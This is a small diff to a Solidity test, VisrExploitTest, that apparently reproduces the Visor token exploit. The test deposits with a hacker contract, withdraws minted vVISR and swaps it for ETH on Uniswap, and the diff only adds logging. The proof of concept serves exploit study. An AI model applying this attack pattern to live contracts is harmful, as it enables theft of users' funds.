@@ -39,6 +39,7 @@ contract VisrExploitTest is Test {
         // Deposit setting the from contract to the malicious hacker contract
         console.log("ETH BALANCE BEFORE HACK: ", address(0x7).balance);
         visrContract.deposit(MAX_INT_MINTABLE, address(visrExploitContract), address(0x7));
+        console.log("VVSIR BALANCE AFTER DEPOSIT: ", vvisrToken.balanceOf(address(0x7)));
         visrContract.withdraw(vvisrToken.balanceOf(address(0x7)), address(0x7), address(0x7));
 
         // Setup path swaps for Uniswap & approve Uniswap to trade our token for ETH
@@ -52,6 +53,6 @@ contract VisrExploitTest is Test {
             uniswapContract.swapExactTokensForETH(visrToken.balanceOf(address(0x7)), 0, path, address(0x7), 2650097619);
         uint visrTokensTraded = amounts[0] / 1e18;
         uint ethTokensReceived = amounts[1] / 1e18;
-        console.log("Visr amount traded:", visrTokensTraded, "for value of ETH", ethTokensReceived);
+        console.log("Visr amount traded:", visrTokensTraded, "for value of ETH:", ethTokensReceived);
     }
 }
